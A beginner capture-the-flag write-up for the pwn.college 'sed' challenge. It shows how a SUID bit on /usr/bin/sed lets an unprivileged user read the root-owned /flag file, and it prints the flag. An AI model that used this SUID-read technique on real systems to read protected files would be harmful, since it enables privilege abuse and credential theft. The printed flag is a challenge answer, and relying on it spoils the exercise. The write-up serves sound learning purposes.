---
layout: page
title: "Challenge Name: sed"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/sed`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/sed
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/sed
```

- The `s` in `-rws` indicates it's a SUID binary.
- `sed` runs with **root privileges**.

## 🚀 Exploitation

The `sed` command (short for Stream EDitor) is a powerful Linux tool used for searching, substituting, inserting, and deleting text in a stream or file.

It’s ideal for on-the-fly editing or automating changes in scripts.

sed'd -n option allows user to printf specific line of a file , we can use this to reveal the flag.

```bash
sed -n '1p' /flag
```

Output:
```
pwn.college{IduzLBGf7GdgVPLRPtiQOvJGNYS.ddzNxwSM0IzMyEzW}
```
